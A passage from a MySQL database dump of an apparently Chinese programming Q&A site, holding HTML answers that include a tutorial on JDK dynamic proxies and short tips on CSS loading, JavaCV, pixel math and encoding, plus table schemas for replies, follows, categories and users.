public void add() {\r\n		System.out.println(\"--------------------add---------------\");\r\n	}\r\n}\r\n\r\npackage dynamic.proxy; \r\n\r\nimport org.junit.Test;\r\n\r\n/**\r\n * 动态代理测试类\r\n * @author zyb\r\n * @since 2012-8-9\r\n *\r\n */\r\npublic class ProxyTest {\r\n\r\n	@Test\r\n	public void testProxy() throws Throwable {\r\n		// 实例化目标对象\r\n		UserService userService = new UserServiceImpl();\r\n		\r\n		// 实例化InvocationHandler\r\n		MyInvocationHandler invocationHandler = new MyInvocationHandler(userService);\r\n		\r\n		// 根据目标对象生成代理对象\r\n		UserService proxy = (UserService) invocationHandler.getProxy();\r\n		\r\n		// 调用代理对象的方法\r\n		proxy.add();\r\n		\r\n	}\r\n}\r\n</code></pre>\r\n\r\n<p><span style=\"color:rgb(0, 0, 0); font-family:helvetica,tahoma,arial,sans-serif; font-size:14px\">执行结果如下：&nbsp;</span><br />\r\n<strong>------------------before------------------&nbsp;<br />\r\n--------------------add---------------&nbsp;<br />\r\n-------------------after------------------</strong><span style=\"color:rgb(0, 0, 0); font-family:helvetica,tahoma,arial,sans-serif; font-size:14px\">&nbsp;</span><br />\r\n<br />\r\n<span style=\"color:rgb(0, 0, 0); font-family:helvetica,tahoma,arial,sans-serif; font-size:14px\">&nbsp;&nbsp; 用起来是很简单吧，其实这里基本上就是AOP的一个简单实现了，在目标对象的方法执行之前和执行之后进行了增强。Spring的AOP实现其实也是用了Proxy和InvocationHandler这两个东西的。&nbsp;</span><br />\r\n<br />\r\n<span style=\"color:rgb(0, 0, 0); font-family:helvetica,tahoma,arial,sans-serif; font-size:14px\">&nbsp;&nbsp;&nbsp; 用起来是比较简单，但是如果能知道它背后做了些什么手脚，那就更好不过了。首先来看一下JDK是怎样生成代理对象的。既然生成代理对象是用的Proxy类的静态方newProxyInstance，那么我们就去它的源码里看一下它到底都做了些什么？&nbsp;</span></p>\r\n\r\n<pre>\r\n<code class=\"language-java\">/**\r\n * loader:类加载器\r\n * interfaces:目标对象实现的接口\r\n * h:InvocationHandler的实现类\r\n */\r\npublic static Object newProxyInstance(ClassLoader loader,\r\n					  Class&lt;?&gt;[] interfaces,\r\n					  InvocationHandler h)\r\n	throws IllegalArgumentException\r\n    {\r\n	if (h == null) {\r\n	    throw new NullPointerException();\r\n	}\r\n\r\n	/*\r\n	 * Look up or generate the designated proxy class.\r\n	 */\r\n	Class cl = getProxyClass(loader, interfaces);\r\n\r\n	/*\r\n	 * Invoke its constructor with the designated invocation handler.\r\n	 */\r\n	try {\r\n            // 调用代理对象的构造方法（也就是$Proxy0(InvocationHandler h)）\r\n	    Constructor cons = cl.getConstructor(constructorParams);\r\n            // 生成代理类的实例并把MyInvocationHandler的实例传给它的构造方法\r\n	    return (Object) cons.newInstance(new Object[] { h });\r\n	} catch (NoSuchMethodException e) {\r\n	    throw new InternalError(e.toString());\r\n	} catch (IllegalAccessException e) {\r\n	    throw new InternalError(e.toString());\r\n	} catch (InstantiationException e) {\r\n	    throw new InternalError(e.toString());\r\n	} catch (InvocationTargetException e) {\r\n	    throw new InternalError(e.toString());\r\n	}\r\n    }\r\n</code></pre>\r\n\r\n<p><span style=\"color:rgb(0, 0, 0); font-family:helvetica,tahoma,arial,sans-serif; font-size:14px\">我们再进去getProxyClass方法看一下&nbsp;</span></p>\r\n\r\n<pre>\r\n<code class=\"language-java\">public static Class&lt;?&gt; getProxyClass(ClassLoader loader, \r\n                                         Class&lt;?&gt;... interfaces)\r\n	throws IllegalArgumentException\r\n    {\r\n	// 如果目标类实现的接口数大于65535个则抛出异常（我XX，谁会写这么NB的代码啊？）\r\n	if (interfaces.length &gt; 65535) {\r\n	    throw new IllegalArgumentException(\"interface limit exceeded\");\r\n	}\r\n\r\n	// 声明代理对象所代表的Class对象（有点拗口）\r\n	Class proxyClass = null;\r\n\r\n	String[] interfaceNames = new String[interfaces.length];\r\n\r\n	Set interfaceSet = new HashSet();	// for detecting duplicates\r\n\r\n	// 遍历目标类所实现的接口\r\n	for (int i = 0; i &lt; interfaces.length; i++) {\r\n	    \r\n		// 拿到目标类实现的接口的名称\r\n	    String interfaceName = interfaces[i].getName();\r\n	    Class interfaceClass = null;\r\n	    try {\r\n		// 加载目标类实现的接口到内存中\r\n		interfaceClass = Class.forName(interfaceName, false, loader);\r\n	    } catch (ClassNotFoundException e) {\r\n	    }\r\n	    if (interfaceClass != interfaces[i]) {\r\n		throw new IllegalArgumentException(\r\n		    interfaces[i] + \" is not visible from class loader\");\r\n	    }\r\n\r\n		// 中间省略了一些无关紧要的代码 .......\r\n		\r\n		// 把目标类实现的接口代表的Class对象放到Set中\r\n	    interfaceSet.add(interfaceClass);\r\n\r\n	    interfaceNames[i] = interfaceName;\r\n	}\r\n\r\n	// 把目标类实现的接口名称作为缓存（Map）中的key\r\n	Object key = Arrays.asList(interfaceNames);\r\n\r\n	Map cache;\r\n	\r\n	synchronized (loaderToCache) {\r\n		// 从缓存中获取cache\r\n	    cache = (Map) loaderToCache.get(loader);\r\n	    if (cache == null) {\r\n		// 如果获取不到，则新建地个HashMap实例\r\n		cache = new HashMap();\r\n		// 把HashMap实例和当前加载器放到缓存中\r\n		loaderToCache.put(loader, cache);\r\n	    }\r\n\r\n	}\r\n\r\n	synchronized (cache) {\r\n\r\n	    do {\r\n		// 根据接口的名称从缓存中获取对象\r\n		Object value = cache.get(key);\r\n		if (value instanceof Reference) {\r\n		    proxyClass = (Class) ((Reference) value).get();\r\n		}\r\n		if (proxyClass != null) {\r\n		    // 如果代理对象的Class实例已经存在，则直接返回\r\n		    return proxyClass;\r\n		} else if (value == pendingGenerationMarker) {\r\n		    try {\r\n			cache.wait();\r\n		    } catch (InterruptedException e) {\r\n		    }\r\n		    continue;\r\n		} else {\r\n		    cache.put(key, pendingGenerationMarker);\r\n		    break;\r\n		}\r\n	    } while (true);\r\n	}\r\n\r\n	try {\r\n	    // 中间省略了一些代码 .......\r\n		\r\n		// 这里就是动态生成代理对象的最关键的地方\r\n		byte[] proxyClassFile =	ProxyGenerator.generateProxyClass(\r\n		    proxyName, interfaces);\r\n		try {\r\n			// 根据代理类的字节码生成代理类的实例\r\n		    proxyClass = defineClass0(loader, proxyName,\r\n			proxyClassFile, 0, proxyClassFile.length);\r\n		} catch (ClassFormatError e) {\r\n		    throw new IllegalArgumentException(e.toString());\r\n		}\r\n	    }\r\n	    // add to set of all generated proxy classes, for isProxyClass\r\n	    proxyClasses.put(proxyClass, null);\r\n\r\n	} \r\n	// 中间省略了一些代码 .......\r\n	\r\n	return proxyClass;\r\n    }\r\n</code></pre>\r\n\r\n<p><span style=\"color:rgb(0, 0, 0); font-family:helvetica,tahoma,arial,sans-serif; font-size:14px\">进去ProxyGenerator类的静态方法generateProxyClass，这里是真正生成代理类class字节码的地方。&nbsp;</span></p>\r\n\r\n<pre>\r\n<code class=\"language-java\"> public static byte[] generateProxyClass(final String name,\r\n                                            Class[] interfaces)\r\n    {\r\n        ProxyGenerator gen = new ProxyGenerator(name, interfaces);\r\n		// 这里动态生成代理类的字节码，由于比较复杂就不进去看了\r\n        final byte[] classFile = gen.generateClassFile();\r\n\r\n		// 如果saveGeneratedFiles的值为true，则会把所生成的代理类的字节码保存到硬盘上\r\n        if (saveGeneratedFiles) {\r\n            java.security.AccessController.doPrivileged(\r\n            new java.security.PrivilegedAction&lt;Void&gt;() {\r\n                public Void run() {\r\n                    try {\r\n                        FileOutputStream file =\r\n                            new FileOutputStream(dotToSlash(name) + \".class\");\r\n                        file.write(classFile);\r\n                        file.close();\r\n                        return null;\r\n                    } catch (IOException e) {\r\n                        throw new InternalError(\r\n                            \"I/O exception saving generated file: \" + e);\r\n                    }\r\n                }\r\n            });\r\n        }\r\n\r\n		// 返回代理类的字节码\r\n        return classFile;\r\n    }\r\n</code></pre>\r\n\r\n<p><span style=\"color:rgb(0, 0, 0); font-family:helvetica,tahoma,arial,sans-serif; font-size:14px\">现在，JDK是怎样动态生成代理类的字节的原理已经一目了然了。&nbsp;</span><br />\r\n<br />\r\n<span style=\"color:rgb(0, 0, 0); font-family:helvetica,tahoma,arial,sans-serif; font-size:14px\">好了，再来解决另外一个问题，那就是由谁来调用InvocationHandler的invoke方法的。要解决这个问题就要看一下JDK到底为我们生成了一个什么东西。用以下代码可以获取到JDK为我们生成的字节码并写到硬盘中。&nbsp;</span></p>\r\n\r\n<pre>\r\n<code class=\"language-java\">package dynamic.proxy; \r\n\r\nimport java.io.FileOutputStream;\r\nimport java.io.IOException;\r\n\r\nimport sun.misc.ProxyGenerator;\r\n\r\n/**\r\n * 代理类的生成工具\r\n * @author zyb\r\n * @since 2012-8-9\r\n */\r\npublic class ProxyGeneratorUtils {\r\n\r\n	/**\r\n	 * 把代理类的字节码写到硬盘上\r\n	 * @param path 保存路径\r\n	 */\r\n	public static void writeProxyClassToHardDisk(String path) {\r\n		// 第一种方法，这种方式在刚才分析ProxyGenerator时已经知道了\r\n		// System.getProperties().put(\"sun.misc.ProxyGenerator.saveGeneratedFiles\", true);\r\n		\r\n		// 第二种方法\r\n		\r\n		// 获取代理类的字节码\r\n		byte[] classFile = ProxyGenerator.generateProxyClass(\"$Proxy11\", UserServiceImpl.class.getInterfaces());\r\n		\r\n		FileOutputStream out = null;\r\n		\r\n		try {\r\n			out = new FileOutputStream(path);\r\n			out.write(classFile);\r\n			out.flush();\r\n		} catch (Exception e) {\r\n			e.printStackTrace();\r\n		} finally {\r\n			try {\r\n				out.close();\r\n			} catch (IOException e) {\r\n				e.printStackTrace();\r\n			}\r\n		}\r\n	}\r\n}\r\n\r\npackage dynamic.proxy; \r\n\r\nimport org.junit.Test;\r\n\r\n/**\r\n * 动态代理测试类\r\n * @author zyb\r\n * @since 2012-8-9\r\n *\r\n */\r\npublic class ProxyTest {\r\n\r\n	@Test\r\n	public void testProxy() throws Throwable {\r\n		// 实例化目标对象\r\n		UserService userService = new UserServiceImpl();\r\n		\r\n		// 实例化InvocationHandler\r\n		MyInvocationHandler invocationHandler = new MyInvocationHandler(userService);\r\n		\r\n		// 根据目标对象生成代理对象\r\n		UserService proxy = (UserService) invocationHandler.getProxy();\r\n		\r\n		// 调用代理对象的方法\r\n		proxy.add();\r\n		\r\n	}\r\n	\r\n	@Test\r\n	public void testGenerateProxyClass() {\r\n		ProxyGeneratorUtils.writeProxyClassToHardDisk(\"F:/$Proxy11.class\");\r\n	}\r\n}\r\n</code></pre>\r\n\r\n<p><span style=\"color:rgb(0, 0, 0); font-family:helvetica,tahoma,arial,sans-serif; font-size:14px\">通过以上代码，就可以在F盘上生成一个$Proxy.class文件了，现在用反编译工具来看一下这个class文件里面的内容。&nbsp;</span></p>\r\n\r\n<pre>\r\n<code class=\"language-java\">// Decompiled by DJ v3.11.11.95 Copyright 2009 Atanas Neshkov  Date: 2012/8/9 20:11:32\r\n// Home Page: http://members.fortunecity.com/neshkov/dj.html  http://www.neshkov.com/dj.html - Check often for new version!\r\n// Decompiler options: packimports(3) \r\n\r\nimport dynamic.proxy.UserService;\r\nimport java.lang.reflect.*;\r\n\r\npublic final class $Proxy11 extends Proxy\r\n    implements UserService\r\n{\r\n\r\n	// 构造方法，参数就是刚才传过来的MyInvocationHandler类的实例\r\n    public $Proxy11(InvocationHandler invocationhandler)\r\n    {\r\n        super(invocationhandler);\r\n    }\r\n\r\n    public final boolean equals(Object obj)\r\n    {\r\n        try\r\n        {\r\n            return ((Boolean)super.h.invoke(this, m1, new Object[] {\r\n                obj\r\n            })).booleanValue();\r\n        }\r\n        catch(Error _ex) { }\r\n        catch(Throwable throwable)\r\n        {\r\n            throw new UndeclaredThrowableException(throwable);\r\n        }\r\n    }\r\n\r\n	/**\r\n	 * 这个方法是关键部分\r\n	 */\r\n    public final void add()\r\n    {\r\n        try\r\n        {\r\n			// 实际上就是调用MyInvocationHandler的public Object invoke(Object proxy, Method method, Object[] args)方法，第二个问题就解决了\r\n            super.h.invoke(this, m3, null);\r\n            return;\r\n        }\r\n        catch(Error _ex) { }\r\n        catch(Throwable throwable)\r\n        {\r\n            throw new UndeclaredThrowableException(throwable);\r\n        }\r\n    }\r\n\r\n    public final int hashCode()\r\n    {\r\n        try\r\n        {\r\n            return ((Integer)super.h.invoke(this, m0, null)).intValue();\r\n        }\r\n        catch(Error _ex) { }\r\n        catch(Throwable throwable)\r\n        {\r\n            throw new UndeclaredThrowableException(throwable);\r\n        }\r\n    }\r\n\r\n    public final String toString()\r\n    {\r\n        try\r\n        {\r\n            return (String)super.h.invoke(this, m2, null);\r\n        }\r\n        catch(Error _ex) { }\r\n        catch(Throwable throwable)\r\n        {\r\n            throw new UndeclaredThrowableException(throwable);\r\n        }\r\n    }\r\n\r\n    private static Method m1;\r\n    private static Method m3;\r\n    private static Method m0;\r\n    private static Method m2;\r\n\r\n	// 在静态代码块中获取了4个方法：Object中的equals方法、UserService中的add方法、Object中的hashCode方法、Object中toString方法\r\n    static \r\n    {\r\n        try\r\n        {\r\n            m1 = Class.forName(\"java.lang.Object\").getMethod(\"equals\", new Class[] {\r\n                Class.forName(\"java.lang.Object\")\r\n            });\r\n            m3 = Class.forName(\"dynamic.proxy.UserService\").getMethod(\"add\", new Class[0]);\r\n            m0 = Class.forName(\"java.lang.Object\").getMethod(\"hashCode\", new Class[0]);\r\n            m2 = Class.forName(\"java.lang.Object\").getMethod(\"toString\", new Class[0]);\r\n        }\r\n        catch(NoSuchMethodException nosuchmethodexception)\r\n        {\r\n            throw new NoSuchMethodError(nosuchmethodexception.getMessage());\r\n        }\r\n        catch(ClassNotFoundException classnotfoundexception)\r\n        {\r\n            throw new NoClassDefFoundError(classnotfoundexception.getMessage());\r\n        }\r\n    }\r\n}\r\n</code></pre>\r\n\r\n<p><span style=\"color:rgb(0, 0, 0); font-family:helvetica,tahoma,arial,sans-serif; font-size:14px\">好了，到目前为止，前面 的两个问题都已经知道回事了，现在再用JDK动态代理的时候就不只会用而已了，真正的达到了&ldquo;知其然，知其所以然&rdquo;的目的。。。</span><img src=\"http://rejoy.iteye.com/images/smiles/icon_biggrin.gif\" style=\"border:0px; color:rgb(0, 0, 0); font-family:helvetica,tahoma,arial,sans-serif; font-size:14px; line-height:25.1875px\" /><span style=\"color:rgb(0, 0, 0); font-family:helvetica,tahoma,arial,sans-serif; font-size:14px\">&nbsp;</span><img src=\"http://rejoy.iteye.com/images/smiles/icon_biggrin.gif\" style=\"border:0px; color:rgb(0, 0, 0); font-family:helvetica,tahoma,arial,sans-serif; font-size:14px; line-height:25.1875px\" /><span style=\"color:rgb(0, 0, 0); font-family:helvetica,tahoma,arial,sans-serif; font-size:14px\">&nbsp;</span><img src=\"http://rejoy.iteye.com/images/smiles/icon_biggrin.gif\" style=\"border:0px; color:rgb(0, 0, 0); font-family:helvetica,tahoma,arial,sans-serif; font-size:14px; line-height:25.1875px\" /><span style=\"color:rgb(0, 0, 0); font-family:helvetica,tahoma,arial,sans-serif; font-size:14px\">&nbsp;</span><br />\r\n<br />\r\n<span style=\"color:rgb(0, 0, 0); font-family:helvetica,tahoma,arial,sans-serif; font-size:14px\">就写到这了，累死了。。</span><img src=\"http://rejoy.iteye.com/images/smiles/icon_cry.gif\" style=\"border:0px; color:rgb(0, 0, 0); font-family:helvetica,tahoma,arial,sans-serif; font-size:14px; line-height:25.1875px\" /><span style=\"color:rgb(0, 0, 0); font-family:helvetica,tahoma,arial,sans-serif; font-size:14px\">&nbsp;</span><img src=\"http://rejoy.iteye.com/images/smiles/icon_cry.gif\" style=\"border:0px; color:rgb(0, 0, 0); font-family:helvetica,tahoma,arial,sans-serif; font-size:14px; line-height:25.1875px\" /><span style=\"color:rgb(0, 0, 0); font-family:helvetica,tahoma,arial,sans-serif; font-size:14px\">&nbsp;</span><br />\r\n&nbsp;</p>\r\n','20150506090528',0,48,0,1),(48,'<p>&nbsp;</p>\r\n\r\n<p>这个动态我认为是体现在以下方面：&nbsp;<br />\r\n在html里用link标签加载css是不管这个css有没有用到都会加载过来，而通过jsloader却是你需要这个css了随时可以去加载，比如页面有隐藏层，在平时是不用显示，你可以不加载这个层相关的css，到需要显示的时候再去加载，这个就是动态。</p>\r\n','20150518085344',0,53,0,1),(49,'<p><span style=\"background-color:rgb(251, 237, 237); color:rgb(0, 0, 0); font-family:helvetica,tahoma,arial,sans-serif; font-size:14px\">J2EE本身是接口规范,定义的大多为接口协议.&nbsp;</span><br />\r\n<span style=\"background-color:rgb(251, 237, 237); color:rgb(0, 0, 0); font-family:helvetica,tahoma,arial,sans-serif; font-size:14px\">基于云架构的J2EE架构语义表达不准确.&nbsp;</span><br />\r\n<br />\r\n<span style=\"background-color:rgb(251, 237, 237); color:rgb(0, 0, 0); font-family:helvetica,tahoma,arial,sans-serif; font-size:14px\">云技术分为硬件云和软件云,主要指分布式计算.&nbsp;</span><br />\r\n<span style=\"background-color:rgb(251, 237, 237); color:rgb(0, 0, 0); font-family:helvetica,tahoma,arial,sans-serif; font-size:14px\">云架构也是针对云技术的系统架构.跟J2EE没什么关系.&nbsp;</span><br />\r\n<br />\r\n<span style=\"background-color:rgb(251, 237, 237); color:rgb(0, 0, 0); font-family:helvetica,tahoma,arial,sans-serif; font-size:14px\">依托J2EE的技术规范,可以实现云技术.</span></p>\r\n','20150518085441',0,54,0,1),(50,'<pre>\r\n<code class=\"language-java\">System.getProperties().getProperty(\"os.arch\");  </code></pre>\r\n\r\n<p>&nbsp;</p>\r\n','20150518085803',0,55,0,1),(51,'<p><span style=\"background-color:rgb(248, 254, 238); font-family:microsoft yahei; font-size:14px\">参考官方的例子：</span>https://github.com/bytedeco/javacv/blob/master/samples/WebcamAndMicrophoneCapture.java</p>\r\n\r\n<pre>\r\n<code class=\"language-java\">   int captureWidth = 1280;\r\n        int captureHeight = 720;\r\n\r\n        // The available FrameGrabber classes include OpenCVFrameGrabber (opencv_highgui),\r\n        // DC1394FrameGrabber, FlyCaptureFrameGrabber, OpenKinectFrameGrabber,\r\n        // PS3EyeFrameGrabber, VideoInputFrameGrabber, and FFmpegFrameGrabber.\r\n        OpenCVFrameGrabber grabber = new OpenCVFrameGrabber(WEBCAM_DEVICE_INDEX);\r\n        grabber.setImageWidth(captureWidth);\r\n        grabber.setImageHeight(captureHeight);\r\n        grabber.start();</code></pre>\r\n\r\n<p>&nbsp;</p>\r\n','20150519091729',0,56,0,2),(52,'<pre>\r\n<code class=\"language-java\">颜色是ARGB，每种占8个字节也就是AAAA AAAA RRRR RRRR GGGG GGGG BBBB BBBB\r\ngray =(int)((r + g + b) / 3); 介于0-255之间。\r\n255 &lt;&lt; 24|gray &lt;&lt; 16|gray &lt;&lt; 8|gray;是重新组成ARGB格式。\r\n255左移24位。就是AAAA AAAA的位置\r\ngray 左移16位，就是RRRR RRRR的位置\r\ngray 左移8位，就是GGGG GGGG的位置\r\ngray，就是BBBB BBBB的位置</code></pre>\r\n\r\n<p>&nbsp;</p>\r\n','20150519092014',0,57,0,2),(53,'<p><span style=\"background-color:rgb(248, 254, 238); font-family:microsoft yahei; font-size:14px\">char a[10]</span><br />\r\n<span style=\"background-color:rgb(248, 254, 238); font-family:microsoft yahei; font-size:14px\">在char数组的初始化后 每个元素默认是&#39;\\0&#39;（结束标识）,当你输入10或者超出10个以后&#39;\\0&#39;都被其他字符替代了，而你用printf(&quot;%s&quot;,a)进行输出时函数会一直</span></p>\r\n\r\n<p><span style=\"background-color:rgb(248, 254, 238); font-family:microsoft yahei; font-size:14px\">进行打印直到遇到&#39;\\0&#39;</span></p>\r\n','20150520084812',0,58,0,2),(54,'<p>乱码原因：<br />\r\n源码文件的编码格式为utf-8，但是window的本地默认编码是gbk，所以在控制台直接打印utf-8的字符串当然是乱码了！</p>\r\n\r\n<p>解决方法：<br />\r\n1、print mystr.decode(&#39;utf-8&#39;).encode(&#39;gbk&#39;)<br />\r\n2、比较通用的方法：</p>\r\n\r\n<p>代码如下</p>\r\n\r\n<pre>\r\n<code class=\"language-python\">import sys\r\ntype = sys.getfilesystemencoding()\r\nprint mystr.decode(\'utf-8\').encode(type)</code></pre>\r\n\r\n<p>&nbsp;</p>\r\n','20150710185948',0,61,1,4);
/*!40000 ALTER TABLE `ask` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `ask_reply`
--

DROP TABLE IF EXISTS `ask_reply`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `ask_reply` (
  `id` bigint(20) NOT NULL AUTO_INCREMENT,
  `ask_id` bigint(20) NOT NULL,
  `at_user_id` bigint(20) DEFAULT NULL,
  `create_date` varchar(255) NOT NULL,
  `user_id` bigint(20) NOT NULL,
  PRIMARY KEY (`id`),
  KEY `FK_pqfjf4xrhhw6ab22cdqymxp3m` (`ask_id`) USING BTREE,
  KEY `FK_rwgvamkhgq4lq1oh4th15d8e8` (`at_user_id`) USING BTREE,
  KEY `FK_6o37kf54wqla874bbas1ta35o` (`user_id`) USING BTREE,
  KEY `FK9CE271A4936822CA` (`ask_id`),
  KEY `FK9CE271A4542B88D9` (`at_user_id`),
  KEY `FK9CE271A48C5B8E5` (`user_id`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `ask_reply`
--

LOCK TABLES `ask_reply` WRITE;
/*!40000 ALTER TABLE `ask_reply` DISABLE KEYS */;
/*!40000 ALTER TABLE `ask_reply` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `attention_article`
--

DROP TABLE IF EXISTS `attention_article`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `attention_article` (
  `id` bigint(20) NOT NULL AUTO_INCREMENT,
  `article_id` bigint(20) NOT NULL,
  `create_date` varchar(255) NOT NULL,
  `user_id` bigint(20) NOT NULL,
  PRIMARY KEY (`id`),
  KEY `FK_bh168lfhgaka41spkjuwb3xdq` (`article_id`) USING BTREE,
  KEY `FK_n1eypo0so490sxfl3lao9l4tb` (`user_id`) USING BTREE,
  KEY `FKA72396D5E792E6AC` (`article_id`),
  KEY `FKA72396D58C5B8E5` (`user_id`)
) ENGINE=MyISAM AUTO_INCREMENT=2 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `attention_article`
--

LOCK TABLES `attention_article` WRITE;
/*!40000 ALTER TABLE `attention_article` DISABLE KEYS */;
INSERT INTO `attention_article` VALUES (1,1,'20150713114708',2);
/*!40000 ALTER TABLE `attention_article` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `attention_question`
--

DROP TABLE IF EXISTS `attention_question`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `attention_question` (
  `id` bigint(20) NOT NULL AUTO_INCREMENT,
  `create_date` varchar(255) NOT NULL,
  `question_id` bigint(20) NOT NULL,
  `user_id` bigint(20) NOT NULL,
  PRIMARY KEY (`id`),
  KEY `FK_nr1ybuajr7w5i23swbg5sa65q` (`question_id`) USING BTREE,
  KEY `FK_1j3rr67py4fuvpc6wgpi304nf` (`user_id`) USING BTREE,
  KEY `FK4110ADE7BED47E4A` (`question_id`),
  KEY `FK4110ADE78C5B8E5` (`user_id`)
) ENGINE=MyISAM AUTO_INCREMENT=4 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `attention_question`
--

LOCK TABLES `attention_question` WRITE;
/*!40000 ALTER TABLE `attention_question` DISABLE KEYS */;
INSERT INTO `attention_question` VALUES (1,'20150419210457',16,2),(2,'20150419212041',31,2),(3,'20150421201803',35,2);
/*!40000 ALTER TABLE `attention_question` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `blocked_fund`
--

DROP TABLE IF EXISTS `blocked_fund`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `blocked_fund` (
  `id` bigint(20) NOT NULL AUTO_INCREMENT,
  `comments` varchar(255) DEFAULT NULL,
  `create_date` varchar(255) NOT NULL,
  `money` double NOT NULL,
  `obj_id` bigint(20) NOT NULL,
  `obj_type` int(11) NOT NULL,
  `t_state` bit(1) NOT NULL,
  `user_id` bigint(20) NOT NULL,
  PRIMARY KEY (`id`),
  KEY `FK_1lxcri8baj1jafih52dm1j9f9` (`user_id`),
  KEY `FKFECE4D388C5B8E5` (`user_id`)
) ENGINE=MyISAM AUTO_INCREMENT=6 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `blocked_fund`
--

LOCK TABLES `blocked_fund` WRITE;
/*!40000 ALTER TABLE `blocked_fund` DISABLE KEYS */;
/*!40000 ALTER TABLE `blocked_fund` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `category`
--

DROP TABLE IF EXISTS `category`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `category` (
  `id` bigint(20) NOT NULL AUTO_INCREMENT,
  `article_num` bigint(20) NOT NULL,
  `description` varchar(255) DEFAULT NULL,
  `name` varchar(32) NOT NULL,
  `poster` varchar(255) DEFAULT NULL,
  `question_num` bigint(20) NOT NULL,
  `sort_index` int(11) NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=MyISAM AUTO_INCREMENT=9 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `category`
--

LOCK TABLES `category` WRITE;
/*!40000 ALTER TABLE `category` DISABLE KEYS */;
INSERT INTO `category` VALUES (1,4,'Java','Java','/upload/category/1/511a5a56-0e5e-4095-9a6e-a7f56166ec1f.poster',0,1),(2,1,'js编程语言','JavaScript','/upload/category/2/11ab6b2a-b79f-4ed9-a74f-d2d4c3adad91.poster',0,1),(3,1,'前台html语言','html/css','/upload/category/3/e526837d-848d-46e5-b7cf-9e331381ee7a.poster',0,3),(4,0,'C语言是在70年代初问世的。一九七八年由美国电话电报公司(AT&T)贝尔实验室正式发表了C语言。同时由B.W.Kernighan和D.M.Ritchit合著了著名的“THE C PROGRAMMING LANGUAGE”一书。通常简称为《K&R》，也有人称之为《K&R》标准。但是，在《K&R》中并没有定义一个完整的标准C语言，后来由美国国家标准学会在此基础上制定了一个C 语言标准，于一九八三年发表。通常称之为ANSI C。','c/c++','/upload/category/4/ca62fa67-aa85-44e8-9c02-746f20a2c9e1.poster',0,3),(5,3,'Go是Google开发的一种编译型，可平行化，并具有垃圾回收功能的编程语言。[3]\r\n罗伯特·格瑞史莫（Robert Griesemer），罗勃·派克（Rob Pike）及肯·汤普逊于2007年9月开始设计Go语言，[2]，稍后Ian Lance Taylor, Russ Cox加入项目中。Go语言是基于Inferno操作系统所开发的。[4]Go语言于2009年11月正式宣布推出，成为开放源代码项目，并在Linux及Mac OS X平台上进行了实现，后追加Windows系统下的实现。','golang','/upload/category/5/a30223ec-28b0-4d50-b9ad-219a1b0e71c4.poster',0,3),(6,0,'Objective-C，通常写作ObjC和较少用的Objective C或Obj-C，是扩充C的面向对象编程语言。它主要使用于Mac OS X和GNUstep这两个使用OpenStep标准的系统，而在NeXTSTEP和OpenStep中它更是基本语言。Objective-C可以在GCC以及Clang运作的系统上编写和编译，因为GCC与Clang含Objective-C的编译器。','objective-c','/upload/category/6/37e98a0c-c540-42f5-86e5-7021b42ac062.poster',0,3),(7,2,'Python（英语发音：/ˈpaɪθən/）, 是一种面向对象、解释型计算机程序设计语言，由Guido van Rossum于1989年底发明，第一个公开发行版发行于1991年，Python 源代码同样遵循 GPL(GNU General Public License)协议[1] 。。','python','/upload/category/7/fbee2de7-fd19-4ad1-9eae-c377add7b028.poster',0,3),(8,0,'22222','c#','/upload/category/8/e3685bed-d7d5-4f16-8f95-8a06c8a32e40.poster',0,3);
/*!40000 ALTER TABLE `category` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `cs_user`
--

DROP TABLE IF EXISTS `cs_user`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `cs_user` (
  `id` bigint(20) NOT NULL AUTO_INCREMENT,
  `birth` varchar(255) DEFAULT NULL,
  `cellphone` varchar(32) DEFAULT NULL,
  `create_name` varchar(255) DEFAULT NULL,
  `email` varchar(255) DEFAULT NULL,
  `introduce` varchar(255) DEFAULT NULL,
  `last_login_date` varchar(255) NOT NULL,
  `nick_name` varchar(255) DEFAULT NULL,
  `password` varchar(255) NOT NULL,
  `photo` varchar(255) DEFAULT NULL,
  `question_num` int(11) NOT NULL,
  `register_date` varchar(255) NOT NULL,
  `user_role` int(11) NOT NULL,
  `sex` int(11) NOT NULL,
  `user_state` int(11) NOT NULL,
  `qq` varchar(255) DEFAULT NULL,
  `web` varchar(255) DEFAULT NULL,
  `balance` double NOT NULL,
  `blocked_fund` double NOT NULL,
  `email_key` varchar(255) DEFAULT NULL,
  PRIMARY KEY (`id`),
  UNIQUE KEY `UK_hysiy0vwpw5xmbia40uyjx42d` (`cellphone`) USING BTREE,
  UNIQUE KEY `UK_snpbbrsl7sul1w9tjl3fd00u7` (`email`) USING BTREE
) ENGINE=MyISAM AUTO_INCREMENT=20 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `cs_user`
--

LOCK TABLES `cs_user` WRITE;
/*!40000 ALTER TABLE `cs_user` DISABLE KEYS */;
